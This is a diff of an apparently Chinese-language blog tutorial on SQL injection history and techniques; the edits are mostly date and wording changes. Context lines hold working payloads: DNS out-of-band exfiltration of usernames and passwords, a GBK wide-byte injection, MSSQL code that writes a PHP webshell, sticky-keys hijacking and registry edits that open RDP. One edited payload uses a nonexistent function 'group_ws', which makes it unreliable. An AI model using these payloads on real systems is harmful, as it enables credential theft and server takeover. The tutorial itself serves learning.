@@ -24,7 +24,7 @@
 <meta property="og:description" content="前世1998时光回溯到1998年，这一年是中国证券市场的开端，这一年乌蝇哥在《旺角卡门》里贡献出了在16年火遍大江南北的表情包[1] ，也是这一年Rain Forest Puppy（RFP）在杂志phrack 54上发表题目为《NT web Technology vulnerabilities》[2]的文章，在 —[ ODBC and MS SQL server 6.5 这一节首次提到了SQL注入">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-03-20T13:52:11.000Z">
-<meta property="article:modified_time" content="2023-04-13T10:32:20.403Z">
+<meta property="article:modified_time" content="2023-05-11T03:49:55.158Z">
 <meta property="article:author" content="sheny">
 <meta property="article:tag" content="SQL Injection">
 <meta name="twitter:card" content="summary_large_image">
@@ -288,7 +288,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年4月13日 晚上
+                    本文最后更新于：2023年5月11日 中午
                   
                 
               </p>
@@ -443,7 +443,7 @@
 <p>获取表中字段下的数据:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select password from users limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">and</span> load_file(concat(<span class="hljs-string">&#x27;\\\\&#x27;</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;.github.io\\abc&#x27;</span>))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 <p>因为在load_file里面不能使用@ ~等符号所以要区分数据我们可以先用group_ws()函数分割在用hex()函数转成十六进制即可 出来了再转回去:</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(concat_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and load_file(concat(&#x27;</span>\\\\<span class="hljs-string">&#x27;,(select hex(group_ws(&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;,username,password)) from users limit 0,1),&#x27;</span>.github.io\\abc<span class="hljs-string">&#x27;))--+</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入有时也被归类为<a href="#%E7%9B%B2%E6%B3%A8">盲注</a>，通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p>
 <p>报错注入又分为两种：</p>
@@ -478,7 +478,7 @@
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form users; <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> form emails;<br></code></pre></td></tr></table></figure>
 
 <h4 id="宽字节注入-8"><a href="#宽字节注入-8" class="headerlink" title="宽字节注入[8]"></a>宽字节注入<sup id="fnref:8" class="footnote-ref"><a href="#fn:8" rel="footnote"><span class="hint--top hint--rounded" aria-label="https://cloud.tencent.com/developer/article/1920885">[8]</span></a></sup></h4><p>宽字节注入就是用宽字节去中和掉转义中加的<code>/</code>这个符号</p>
-<h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样就没法闭合单引号了<br>GBK双字节编码：一个汉字用两个字节表示，首字节对应<code>0×81-0xFE</code>，尾字节对应<code>0×40-0xFE</code>（除0×7F），刚好涵盖了转义符号<code>\</code>对应的编码<code>0×5C``0xD5-0×5C</code> 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 <code>%d5%5c</code> 经URL解码后为“诚”</p>
+<h5 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h5><p>PHP中在 magic_quotes_gpc=On 的情况下，提交的参数中如果带有单引号<code>&#39;</code>，就会被自动转义<code>\&#39;</code>，这样就没法闭合单引号了<br>GBK双字节编码：一个汉字用两个字节表示，首字节对应<code>0×81-0xFE</code>，尾字节对应<code>0×40-0xFE</code>（除<code>0×7F</code>），刚好涵盖了转义符号<code>\</code>对应的编码<code>0×5C</code>,<code>0xD5-0×5C</code> 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 <code>%d5%5c</code> 经URL解码后为“诚”</p>
 <p>下面分析攻击过程：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">/test.php?username=test%d5′%20or%201=1%23<br></code></pre></td></tr></table></figure>
 <p>经过浏览器编码，username参数值为(单引号的编码0×27)：</p>
@@ -569,7 +569,7 @@
 <p>利用filesystemobject写webshell（目录必须存在，否则也会显示成功，但是没有文件写入）:</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;C:\phpstudy_pro\www\1.php&#x27;</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_REQUEST[&quot;a&quot;]);?&gt;&#x27;</span> <span class="hljs-comment">-- 在sqlserver2019+win server2019中测试，win defender会报毒并删除一句话木马</span><br></code></pre></td></tr></table></figure>
 
-<h4 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h4><p>沙盒模式是数据库的一种安全功能在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动 </p>
+<h4 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h4><p>沙盒模式是数据库的一种安全功能在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的，<br>利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动 </p>
 <p>局限：<br>（1）Microsoft.jet.oledb.4.0一般在32位操作系统上才可以<br>（2）Windows 2008以上 默认无 Access 数据库文件, 需要自己上传 sqlserver2015默认禁用Ad Hoc Distributed Queries，需要开启</p>
 <p>开启Ad Hoc Distributed Queries：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">-- 关闭Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure>
@@ -598,7 +598,7 @@
 <p>劫持成功后连按5次shift会弹出cmd（win defender会拦截弹出的cmd并删除已经劫持的注册表） 还可以修改注册表来开启3389：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master.dbo.xp_regwrite<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
 
-<h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>Microsoft SQL Server 2005之后，实现了对 Microsoft .NET Framework 的公共语言运行时(CLR)的集成CLR 集成使得现在可以使用 .NET Framework 语言编写代码，从而能够在 SQL Server 上运行，现在就可以通过 C# 来编写 SQL Server 自定义函数、存储过程、触发器等</p>
+<h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>Microsoft SQL Server 2005之后，实现了对 Microsoft .NET Framework 的公共语言运行时(CLR)的集成, CLR 集成使得现在可以使用 .NET Framework 语言编写代码，从而能够在 SQL Server 上运行，现在就可以通过 C# 来编写 SQL Server 自定义函数、存储过程、触发器等</p>
 <p>开启CLR：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-comment">-- 关闭CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure>
 <p>当导入了不安全的程序集之后，需将数据库标记为可信任的：</p>
@@ -880,7 +880,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年4月13日</div>
+          <div>2023年5月11日</div>
         </div>
       
       
